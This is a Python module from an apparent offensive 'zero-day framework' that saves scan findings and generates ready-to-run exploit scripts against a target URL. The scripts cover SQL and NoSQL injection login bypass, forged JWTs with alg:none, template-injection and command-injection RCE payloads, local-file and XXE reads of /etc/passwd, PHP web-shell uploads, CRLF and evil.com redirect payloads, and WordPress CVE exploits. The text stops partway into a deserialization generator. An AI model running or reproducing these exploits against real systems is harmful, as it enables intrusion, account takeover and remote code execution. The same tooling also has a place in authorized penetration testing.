from __future__ import annotations

import argparse
import json
import os
import threading
from datetime import datetime
from functools import partial
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlparse

from .orchestrator import ZeroDayOrchestrator, ZeroDayReport
from .models import ZeroDayFinding, ExploitPayload, ProofOfConcept


FINDINGS_DIR = Path(r"attack-surface\Found")


def save_findings(report: ZeroDayReport) -> Path:
    """Save zero-day findings to structured files."""
    # Create output directory
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_dir = FINDINGS_DIR / f"session_{timestamp}"
    session_dir.mkdir(parents=True, exist_ok=True)
    
    # Save main report
    report_file = session_dir / "REPORT.txt"
    report_file.write_text(report.final, encoding="utf-8")
    
    # Save structured findings as JSON
    findings_data = []
    for f in report.findings:
        finding_dict = {
            "id": f.id,
            "title": f.title,
            "severity": f.severity,
            "vulnerability_class": f.vulnerability_class,
            "attack_vector": f.attack_vector,
            "validation_status": f.validation_status,
            "false_positive_checks": list(f.false_positive_checks),
            "payloads": [
                {
                    "name": p.name,
                    "category": p.category,
                    "payload": p.payload,
                    "target_component": p.target_component,
                    "cve_reference": p.cve_reference,
                    "confidence": p.confidence
                }
                for p in f.payloads
            ],
            "poc": None
        }
        if f.poc:
            finding_dict["poc"] = {
                "title": f.poc.title,
                "vulnerability_type": f.poc.vulnerability_type,
                "steps": list(f.poc.steps),
                "expected_result": f.poc.expected_result,
                "actual_result": f.poc.actual_result,
                "evidence_hash": f.poc.evidence_hash,
                "verified": f.poc.verified
            }
        findings_data.append(finding_dict)
    
    findings_file = session_dir / "findings.json"
    findings_file.write_text(json.dumps(findings_data, indent=2, ensure_ascii=False), encoding="utf-8")
    
    # Save individual exploit files
    exploits_dir = session_dir / "exploits"
    exploits_dir.mkdir(exist_ok=True)
    
    # Extract target URL from report
    target_url = report.target if report.target.startswith("http") else "http://target"
    
    # Extract and save exploit code from report
    _save_exploit_files(exploits_dir, report.findings, target_url)
    
    # Save payloads as separate file
    payloads_file = session_dir / "payloads.txt"
    payload_lines = []
    for f in report.findings:
        payload_lines.append(f"# {f.id} - {f.title}")
        for p in f.payloads:
            payload_lines.append(f"{p.name}: {p.payload}")
        payload_lines.append("")
    payloads_file.write_text("\n".join(payload_lines), encoding="utf-8")
    
    # Collect generated exploit files
    exploit_files = [f"exploits/{f.name}" for f in exploits_dir.iterdir() if f.is_file()]
    
    # Save summary
    summary = {
        "timestamp": timestamp,
        "target": report.target,
        "status": report.status,
        "total_findings": len(report.findings),
        "validated_findings": sum(1 for f in report.findings if f.validation_status == "validated"),
        "critical_count": sum(1 for f in report.findings if f.severity == "critical"),
        "high_count": sum(1 for f in report.findings if f.severity == "high"),
        "files_generated": [
            "REPORT.txt",
            "findings.json", 
            "payloads.txt",
        ] + sorted(exploit_files)
    }
    summary_file = session_dir / "summary.json"
    summary_file.write_text(json.dumps(summary, indent=2), encoding="utf-8")
    
    return session_dir


def _save_exploit_files(exploits_dir: Path, findings: tuple, target_url: str = "http://target") -> None:
    """Generate and save exploit scripts dynamically based on findings."""
    
    # Analyze findings to determine which exploits to generate
    vuln_types = set()
    for finding in findings:
        vuln_class = finding.vulnerability_class.lower()
        title = finding.title.lower()
        
        # Map vulnerability classes to exploit types
        if any(k in vuln_class for k in ["nosql", "mongo"]):
            vuln_types.add("nosql")
        if any(k in vuln_class for k in ["sql", "sqli"]) and "nosql" not in vuln_class:
            vuln_types.add("sqli")
        if any(k in vuln_class for k in ["jwt", "token", "auth"]):
            vuln_types.add("jwt")
        if any(k in vuln_class for k in ["ssti", "template"]):
            vuln_types.add("ssti")
        if any(k in vuln_class for k in ["lfi", "path", "traversal", "file inclusion"]):
            vuln_types.add("lfi")
        if any(k in vuln_class for k in ["xxe", "xml"]):
            vuln_types.add("xxe")
        if any(k in vuln_class for k in ["rce", "command", "injection", "exec"]):
            vuln_types.add("rce")
        if any(k in vuln_class for k in ["crlf", "header"]):
            vuln_types.add("crlf")
        if any(k in vuln_class for k in ["redirect", "open redirect"]):
            vuln_types.add("redirect")
        if any(k in vuln_class for k in ["wordpress", "wp-", "cve-2026"]):
            vuln_types.add("wordpress")
        if any(k in vuln_class for k in ["graphql"]):
            vuln_types.add("graphql")
        if any(k in vuln_class for k in ["upload", "file upload"]):
            vuln_types.add("upload")
        if any(k in vuln_class for k in ["cors"]):
            vuln_types.add("cors")
        if any(k in vuln_class for k in ["prototype", "pollution"]):
            vuln_types.add("prototype")
        if any(k in vuln_class for k in ["deserial", "pickle", "yaml"]):
            vuln_types.add("deserial")
        if any(k in vuln_class for k in ["mass", "assignment", "idor"]):
            vuln_types.add("mass_assign")
        if any(k in vuln_class for k in ["xss", "cross-site scripting"]):
            vuln_types.add("xss")
        if any(k in vuln_class for k in ["ssrf", "server-side request"]):
            vuln_types.add("ssrf")
        
        # Also check title for keywords
        if "cve-2026-60137" in title or "cve-2026-63030" in title:
            vuln_types.add("wordpress")
            vuln_types.add("sqli")
    
    # If no specific vulns detected, generate common ones
    if not vuln_types:
        vuln_types = {"nosql", "jwt"}
    
    # Generate exploits for each vulnerability type
    exploit_generators = {
        "nosql": _gen_nosql_exploit,
        "sqli": _gen_sqli_exploit,
        "jwt": _gen_jwt_exploit,
        "ssti": _gen_ssti_exploit,
        "lfi": _gen_lfi_exploit,
        "xxe": _gen_xxe_exploit,
        "rce": _gen_rce_exploit,
        "crlf": _gen_crlf_exploit,
        "redirect": _gen_redirect_exploit,
        "wordpress": _gen_wordpress_exploit,
        "graphql": _gen_graphql_exploit,
        "upload": _gen_upload_exploit,
        "cors": _gen_cors_exploit,
        "prototype": _gen_prototype_exploit,
        "deserial": _gen_deserial_exploit,
        "mass_assign": _gen_mass_assign_exploit,
        "xss": _gen_xss_exploit,
        "ssrf": _gen_ssrf_exploit,
    }
    
    for vuln_type in vuln_types:
        if vuln_type in exploit_generators:
            exploit_generators[vuln_type](exploits_dir, target_url)
    
    # Always generate attack chain if multiple exploits
    if len(vuln_types) >= 2:
        _gen_attack_chain(exploits_dir, target_url, vuln_types)


def _gen_nosql_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate NoSQL Injection exploit."""
    nosql_exploit = f'''#!/usr/bin/env python3
"""NoSQL Injection Authentication Bypass Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}/api/v1/login"

PAYLOADS = [
    {{"username": {{"$gt": ""}}, "password": {{"$gt": ""}}}},
    {{"username": {{"$ne": None}}, "password": {{"$ne": None}}}},
    {{"username": {{"$exists": True}}, "password": {{"$exists": True}}}},
    {{"username": {{"$regex": ".*"}}, "password": {{"$regex": ".*"}}}},
    {{"username": {{"$where": "1==1"}}, "password": {{"$where": "1==1"}}}},
]

def exploit():
    print(f"[*] Target: {{TARGET}}")
    print(f"[*] Testing {{len(PAYLOADS)}} NoSQL injection payloads...")
    
    for i, payload in enumerate(PAYLOADS, 1):
        try:
            r = requests.post(TARGET, json=payload, headers={{"Content-Type": "application/json"}}, timeout=15, verify=False)
            print(f"[{{i}}] Payload: {{json.dumps(payload)}}")
            print(f"    Status: {{r.status_code}}")
            
            if r.status_code == 200:
                print(f"[+] SUCCESS! Response: {{r.text[:500]}}")
                if "token" in r.text.lower():
                    return r.json().get("token") or r.json().get("access_token")
        except Exception as e:
            print(f"[-] Error: {{e}}")
    return None

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    token = exploit()
    print(f"\\n[+] Token: {{token}}" if token else "\\n[-] Exploit failed")
'''
    (exploits_dir / "nosql_injection.py").write_text(nosql_exploit, encoding="utf-8")


def _gen_sqli_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate SQL Injection exploit."""
    sqli_exploit = f'''#!/usr/bin/env python3
"""SQL Injection Exploit (Union/Error/Time-based)
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import time
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

# SQL injection payloads
PAYLOADS = [
    # Union-based
    ("' UNION SELECT NULL,NULL,NULL--", "union"),
    ("' UNION SELECT username,password,NULL FROM users--", "union"),
    ("1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "union"),
    # Error-based
    ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "error"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "error"),
    # Time-based
    ("'; WAITFOR DELAY '0:0:5'--", "time"),
    ("' AND SLEEP(5)--", "time"),
    ("' OR SLEEP(5)--", "time"),
    # Boolean-based
    ("' AND 1=1--", "bool"),
    ("' AND 1=2--", "bool"),
    # Auth bypass
    ("admin'--", "bypass"),
    ("' OR '1'='1'--", "bypass"),
    ("' OR 1=1--", "bypass"),
    ("admin' OR '1'='1", "bypass"),
]

ENDPOINTS = [
    "/api/login",
    "/api/v1/login",
    "/login",
    "/api/users",
    "/api/v1/users",
    "/api/search",
    "/search",
    "/?id=1",
    "/user?id=1",
    "/wp-json/wp/v2/posts?author__not_in[0]=1",  # CVE-2026-60137
]

def test_sqli():
    print(f"[*] Target: {{TARGET}}")
    
    for endpoint in ENDPOINTS:
        url = f"{{TARGET}}{{endpoint}}"
        print(f"\\n[*] Testing: {{url}}")
        
        for payload, ptype in PAYLOADS:
            try:
                if ptype == "time":
                    start = time.time()
                    r = requests.get(url + payload, timeout=10, verify=False)
                    elapsed = time.time() - start
                    if elapsed >= 5:
                        print(f"[+] TIME-BASED CONFIRMED! Delay: {{elapsed:.2f}}s")
                        print(f"    Payload: {{payload}}")
                        return True
                else:
                    r = requests.get(url + payload, timeout=10, verify=False)
                    if any(err in r.text.lower() for err in ["sql", "mysql", "syntax", "odbc", "oracle"]):
                        print(f"[+] SQL ERROR DETECTED!")
                        print(f"    Payload: {{payload}}")
                        return True
            except Exception as e:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    result = test_sqli()
    print(f"\\n[+] SQLi Confirmed!" if result else "\\n[-] No SQLi found")
'''
    (exploits_dir / "sql_injection.py").write_text(sqli_exploit, encoding="utf-8")


def _gen_jwt_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate JWT Algorithm Confusion exploit."""
    jwt_exploit = f'''#!/usr/bin/env python3
"""JWT Algorithm Confusion (None Algorithm) Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import base64
import json
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

def forge_jwt(payload_data: dict) -> str:
    header = {{"alg": "none", "typ": "JWT"}}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    p = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
    return f"{{h}}.{{p}}."

def exploit():
    print(f"[*] Target: {{TARGET}}")
    payloads = [
        {{"user": "admin", "role": "superuser"}},
        {{"sub": "admin", "admin": True}},
        {{"id": 1, "role": "admin"}},
    ]
    endpoints = ["/api/v1/admin", "/api/admin", "/admin", "/api/v1/profile", "/api/profile"]
    
    for pl in payloads:
        token = forge_jwt(pl)
        print(f"\\n[*] Testing token: {{token[:50]}}...")
        for ep in endpoints:
            try:
                r = requests.get(f"{{TARGET}}{{ep}}", headers={{"Authorization": f"Bearer {{token}}"}}, timeout=10, verify=False)
                if r.status_code == 200:
                    print(f"[+] SUCCESS on {{ep}}! Token accepted")
                    return token
            except:
                pass
    return None

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    result = exploit()
    print(f"\\n[+] Valid token: {{result}}" if result else "\\n[-] alg:none not vulnerable")
'''
    (exploits_dir / "jwt_bypass.py").write_text(jwt_exploit, encoding="utf-8")


def _gen_ssti_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate SSTI exploit."""
    ssti_exploit = f'''#!/usr/bin/env python3
"""Server-Side Template Injection (SSTI) Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

# SSTI payloads for various engines
PAYLOADS = [
    # Detection
    ("{{{{7*7}}}}", "49", "Jinja2/Twig"),
    ("${{7*7}}", "49", "Freemarker/Velocity"),
    ("<%=7*7%>", "49", "ERB"),
    ("#{{7*7}}", "49", "Ruby/Slim"),
    # Jinja2 RCE
    ("{{{{config}}}}", "SECRET", "Jinja2 Config"),
    ("{{{{self.__init__.__globals__}}}}", "__builtins__", "Jinja2 Globals"),
    ("{{{{''.__class__.__mro__[2].__subclasses__()}}}}", "Popen", "Jinja2 RCE"),
    # Twig RCE
    ("{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}", "", "Twig RCE"),
]

ENDPOINTS = ["/", "/search", "/render", "/template", "/preview", "/api/render"]

def test_ssti():
    print(f"[*] Target: {{TARGET}}")
    
    for endpoint in ENDPOINTS:
        for payload, indicator, engine in PAYLOADS:
            url = f"{{TARGET}}{{endpoint}}"
            try:
                # GET parameter
                r = requests.get(url, params={{"q": payload, "name": payload, "template": payload}}, timeout=10, verify=False)
                if indicator in r.text:
                    print(f"[+] SSTI CONFIRMED! Engine: {{engine}}")
                    print(f"    Endpoint: {{endpoint}}")
                    print(f"    Payload: {{payload}}")
                    return True
                # POST
                r = requests.post(url, data={{"name": payload, "template": payload}}, timeout=10, verify=False)
                if indicator in r.text:
                    print(f"[+] SSTI CONFIRMED (POST)! Engine: {{engine}}")
                    return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] SSTI Found!" if test_ssti() else "[-] No SSTI")
'''
    (exploits_dir / "ssti_exploit.py").write_text(ssti_exploit, encoding="utf-8")


def _gen_lfi_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate LFI exploit."""
    lfi_exploit = f'''#!/usr/bin/env python3
"""Local File Inclusion (LFI) Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    ("../../../etc/passwd", "root:"),
    ("....//....//....//etc/passwd", "root:"),
    ("..%2f..%2f..%2fetc/passwd", "root:"),
    ("..%252f..%252f..%252fetc/passwd", "root:"),
    ("/etc/passwd", "root:"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
    ("php://filter/read=string.rot13/resource=/etc/passwd", "ebbg"),
    # Windows
    ("..\\\\..\\\\..\\\\windows\\\\win.ini", "[fonts]"),
    ("C:\\\\Windows\\\\win.ini", "[fonts]"),
]

PARAMS = ["file", "path", "page", "include", "doc", "document", "folder", "root", "pg", "style", "pdf", "template", "php_path", "img"]

def test_lfi():
    print(f"[*] Target: {{TARGET}}")
    
    for payload, indicator in PAYLOADS:
        for param in PARAMS:
            try:
                r = requests.get(TARGET, params={{param: payload}}, timeout=10, verify=False)
                if indicator in r.text:
                    print(f"[+] LFI CONFIRMED!")
                    print(f"    Parameter: {{param}}")
                    print(f"    Payload: {{payload}}")
                    return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] LFI Found!" if test_lfi() else "[-] No LFI")
'''
    (exploits_dir / "lfi_exploit.py").write_text(lfi_exploit, encoding="utf-8")


def _gen_xxe_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate XXE exploit."""
    xxe_exploit = f'''#!/usr/bin/env python3
"""XML External Entity (XXE) Injection Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
]

ENDPOINTS = ["/api/upload", "/api/import", "/api/parse", "/upload", "/import", "/xml", "/soap"]

def test_xxe():
    print(f"[*] Target: {{TARGET}}")
    
    for endpoint in ENDPOINTS:
        for payload in XXE_PAYLOADS:
            url = f"{{TARGET}}{{endpoint}}"
            try:
                r = requests.post(url, data=payload, headers={{"Content-Type": "application/xml"}}, timeout=10, verify=False)
                if "root:" in r.text or "[fonts]" in r.text:
                    print(f"[+] XXE CONFIRMED!")
                    print(f"    Endpoint: {{endpoint}}")
                    return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] XXE Found!" if test_xxe() else "[-] No XXE")
'''
    (exploits_dir / "xxe_exploit.py").write_text(xxe_exploit, encoding="utf-8")


def _gen_rce_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate RCE exploit."""
    rce_exploit = f'''#!/usr/bin/env python3
"""Remote Code Execution (RCE) Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import time
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

RCE_PAYLOADS = [
    # Command injection
    ("; id", "uid="),
    ("| id", "uid="),
    ("$(id)", "uid="),
    ("`id`", "uid="),
    ("; whoami", "root"),
    ("| cat /etc/passwd", "root:"),
    # Time-based
    ("; sleep 5", None),
    ("| sleep 5", None),
    ("$(sleep 5)", None),
]

PARAMS = ["cmd", "exec", "command", "execute", "ping", "query", "host", "ip", "port", "process", "file"]

def test_rce():
    print(f"[*] Target: {{TARGET}}")
    
    for payload, indicator in RCE_PAYLOADS:
        for param in PARAMS:
            try:
                if indicator is None:  # Time-based
                    start = time.time()
                    r = requests.get(TARGET, params={{param: "localhost" + payload}}, timeout=10, verify=False)
                    if time.time() - start >= 5:
                        print(f"[+] TIME-BASED RCE CONFIRMED!")
                        print(f"    Parameter: {{param}}")
                        return True
                else:
                    r = requests.get(TARGET, params={{param: payload}}, timeout=10, verify=False)
                    if indicator in r.text:
                        print(f"[+] RCE CONFIRMED!")
                        print(f"    Parameter: {{param}}")
                        print(f"    Payload: {{payload}}")
                        return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] RCE Found!" if test_rce() else "[-] No RCE")
'''
    (exploits_dir / "rce_exploit.py").write_text(rce_exploit, encoding="utf-8")


def _gen_crlf_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate CRLF Injection exploit."""
    crlf_exploit = f'''#!/usr/bin/env python3
"""CRLF Injection / HTTP Response Splitting Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=injected",
    "%0d%0aX-Injected:true",
    "\\r\\nSet-Cookie:crlf=injected",
    "%0d%0a%0d%0a<html>CRLF</html>",
]

def test_crlf():
    print(f"[*] Target: {{TARGET}}")
    
    for payload in PAYLOADS:
        try:
            r = requests.get(f"{{TARGET}}/redirect?url=http://evil.com{{payload}}", timeout=10, verify=False, allow_redirects=False)
            if "crlf=injected" in str(r.headers) or "X-Injected" in str(r.headers):
                print(f"[+] CRLF CONFIRMED!")
                print(f"    Payload: {{payload}}")
                return True
        except:
            pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] CRLF Found!" if test_crlf() else "[-] No CRLF")
'''
    (exploits_dir / "crlf_exploit.py").write_text(crlf_exploit, encoding="utf-8")


def _gen_redirect_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate Open Redirect exploit."""
    redirect_exploit = f'''#!/usr/bin/env python3
"""Open Redirect Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\\\evil.com",
    "//evil.com/%2f..",
    "///evil.com",
]

PARAMS = ["url", "redirect", "next", "return", "returnUrl", "goto", "destination", "redir", "redirect_uri", "continue"]

def test_redirect():
    print(f"[*] Target: {{TARGET}}")
    
    for payload in PAYLOADS:
        for param in PARAMS:
            try:
                r = requests.get(TARGET, params={{param: payload}}, timeout=10, verify=False, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "evil.com" in loc:
                    print(f"[+] OPEN REDIRECT CONFIRMED!")
                    print(f"    Parameter: {{param}}")
                    print(f"    Location: {{loc}}")
                    return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] Open Redirect Found!" if test_redirect() else "[-] No Open Redirect")
'''
    (exploits_dir / "open_redirect.py").write_text(redirect_exploit, encoding="utf-8")


def _gen_wordpress_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate WordPress CVE exploit (CVE-2026-60137/63030)."""
    wp_exploit = f'''#!/usr/bin/env python3
"""WordPress CVE-2026-60137 & CVE-2026-63030 Exploit
CVE-2026-60137: SQL Injection via author__not_in (CVSS 9.1)
CVE-2026-63030: REST API Batch RCE (CVSS 9.8)
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import json
import time
import re
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

def get_wp_version():
    """Detect WordPress version"""
    for path in ["/wp-includes/version.php", "/readme.html", "/wp-json/"]:
        try:
            r = requests.get(f"{{TARGET}}{{path}}", timeout=10, verify=False)
            match = re.search(r'\\$wp_version\\s*=\\s*[\\'"]([0-9.]+)[\\'"]', r.text)
            if match:
                return match.group(1)
            match = re.search(r'Version\\s+([0-9.]+)', r.text)
            if match:
                return match.group(1)
        except:
            pass
    return None

def check_vulnerable(version):
    """Check if version is vulnerable"""
    if not version:
        return False, False
    v = tuple(map(int, version.split('.')[:3]))
    vuln_60137 = (6,8,0) <= v < (6,8,6) or (6,9,0) <= v < (6,9,5) or (7,0,0) <= v < (7,0,2)
    vuln_63030 = (6,9,0) <= v < (6,9,5) or (7,0,0) <= v < (7,0,2)
    return vuln_60137, vuln_63030

def test_sqli_cve_60137():
    """Test CVE-2026-60137 SQL Injection"""
    print("\\n[*] Testing CVE-2026-60137 (author__not_in SQLi)...")
    
    payloads = [
        "/wp-json/wp/v2/posts?author__not_in[0]=1) OR SLEEP(3)--",
        "/wp-json/wp/v2/posts?author__not_in[]=1) UNION SELECT 1--",
        "/?rest_route=/wp/v2/posts&author__not_in[0]=1) OR 1=1--",
    ]
    
    for payload in payloads:
        url = f"{{TARGET}}{{payload}}"
        try:
            if "SLEEP" in payload:
                start = time.time()
                r = requests.get(url, timeout=10, verify=False)
                if time.time() - start >= 3:
                    print(f"[+] CVE-2026-60137 CONFIRMED (time-based)!")
                    print(f"    Delay: {{time.time()-start:.2f}}s")
                    return True
            else:
                r = requests.get(url, timeout=10, verify=False)
                if any(x in r.text.lower() for x in ["sql", "mysql", "syntax"]):
                    print(f"[+] CVE-2026-60137 CONFIRMED (error-based)!")
                    return True
        except:
            pass
    return False

def test_batch_cve_63030():
    """Test CVE-2026-63030 REST API Batch RCE"""
    print("\\n[*] Testing CVE-2026-63030 (REST API Batch)...")
    
    url = f"{{TARGET}}/wp-json/batch/v1"
    payload = {{
        "requests": [
            {{"path": "/wp/v2/posts?author__not_in[0]=1) OR 1=1--", "method": "GET"}},
            {{"path": "/wp/v2/users", "method": "GET"}}
        ]
    }}
    
    try:
        r = requests.post(url, json=payload, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            if "responses" in data or isinstance(data, list):
                print(f"[+] CVE-2026-63030 Batch endpoint accessible!")
                print(f"    Combined with CVE-2026-60137 = RCE")
                return True
    except:
        pass
    return False

def main():
    print(f"[*] Target: {{TARGET}}")
    
    version = get_wp_version()
    if version:
        print(f"[+] WordPress version: {{version}}")
        vuln_60137, vuln_63030 = check_vulnerable(version)
        if vuln_60137:
            print(f"[!] Version vulnerable to CVE-2026-60137!")
        if vuln_63030:
            print(f"[!] Version vulnerable to CVE-2026-63030!")
    
    sqli = test_sqli_cve_60137()
    batch = test_batch_cve_63030()
    
    if sqli and batch:
        print("\\n[!] CRITICAL: Both CVEs confirmed - RCE possible!")
    elif sqli:
        print("\\n[!] SQL Injection confirmed via CVE-2026-60137")
    elif batch:
        print("\\n[*] Batch endpoint accessible - needs SQLi for RCE")
    else:
        print("\\n[-] Target may not be vulnerable")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
'''
    (exploits_dir / "wordpress_cve.py").write_text(wp_exploit, encoding="utf-8")


def _gen_graphql_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate GraphQL Introspection exploit."""
    gql_exploit = f'''#!/usr/bin/env python3
"""GraphQL Introspection & Injection Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

INTROSPECTION = {{"query": "{{__schema{{types{{name fields{{name}}}}}}}}"}}

def test_graphql():
    print(f"[*] Target: {{TARGET}}")
    
    endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/gql"]
    
    for ep in endpoints:
        url = f"{{TARGET}}{{ep}}"
        try:
            r = requests.post(url, json=INTROSPECTION, timeout=10, verify=False)
            if "__schema" in r.text or "types" in r.text:
                print(f"[+] GraphQL Introspection enabled on {{ep}}!")
                data = r.json()
                types = data.get("data", {{}}).get("__schema", {{}}).get("types", [])
                print(f"    Found {{len(types)}} types")
                return True
        except:
            pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] GraphQL Found!" if test_graphql() else "[-] No GraphQL")
'''
    (exploits_dir / "graphql_exploit.py").write_text(gql_exploit, encoding="utf-8")


def _gen_upload_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate File Upload exploit."""
    upload_exploit = f'''#!/usr/bin/env python3
"""Unrestricted File Upload Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("shell.phtml", "<?php system($_GET['cmd']); ?>", "text/html"),
    ("shell.php%00.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
]

def test_upload():
    print(f"[*] Target: {{TARGET}}")
    
    endpoints = ["/upload", "/api/upload", "/api/v1/upload", "/files/upload"]
    
    for ep in endpoints:
        for fname, content, ctype in PAYLOADS:
            try:
                files = {{"file": (fname, content, ctype)}}
                r = requests.post(f"{{TARGET}}{{ep}}", files=files, timeout=10, verify=False)
                if r.status_code == 200 and ("uploaded" in r.text.lower() or "success" in r.text.lower()):
                    print(f"[+] File uploaded: {{fname}}")
                    return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] Upload Vuln Found!" if test_upload() else "[-] No Upload Vuln")
'''
    (exploits_dir / "file_upload.py").write_text(upload_exploit, encoding="utf-8")


def _gen_cors_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate CORS Misconfiguration exploit."""
    cors_exploit = f'''#!/usr/bin/env python3
"""CORS Misconfiguration Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

def test_cors():
    print(f"[*] Target: {{TARGET}}")
    
    origins = ["https://evil.com", "null", "https://{{TARGET.split('//')[1]}}.evil.com"]
    
    for origin in origins:
        try:
            r = requests.get(TARGET, headers={{"Origin": origin}}, timeout=10, verify=False)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            
            if acao == origin or acao == "*":
                print(f"[+] CORS Misconfiguration!")
                print(f"    Origin: {{origin}}")
                print(f"    ACAO: {{acao}}")
                if acac.lower() == "true":
                    print(f"    ACAC: true (CRITICAL!)")
                return True
        except:
            pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] CORS Vuln Found!" if test_cors() else "[-] No CORS Vuln")
'''
    (exploits_dir / "cors_exploit.py").write_text(cors_exploit, encoding="utf-8")


def _gen_prototype_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate Prototype Pollution exploit."""
    proto_exploit = f'''#!/usr/bin/env python3
"""Prototype Pollution Exploit (Node.js)
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    {{"__proto__": {{"admin": True}}}},
    {{"constructor": {{"prototype": {{"admin": True}}}}}},
    {{"__proto__": {{"isAdmin": True}}}},
]

def test_prototype():
    print(f"[*] Target: {{TARGET}}")
    
    for payload in PAYLOADS:
        try:
            r = requests.post(f"{{TARGET}}/api/user", json=payload, timeout=10, verify=False)
            r2 = requests.get(f"{{TARGET}}/api/user", timeout=10, verify=False)
            if "admin" in r2.text.lower() and "true" in r2.text.lower():
                print(f"[+] Prototype Pollution confirmed!")
                return True
        except:
            pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] Prototype Pollution Found!" if test_prototype() else "[-] No PP")
'''
    (exploits_dir / "prototype_pollution.py").write_text(proto_exploit, encoding="utf-8")


def _gen_deserial_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate Deserialization exploit."""
    deserial_exploit = f'''#!/usr/bin/env python3
"""Insecure Deserialization Exploit
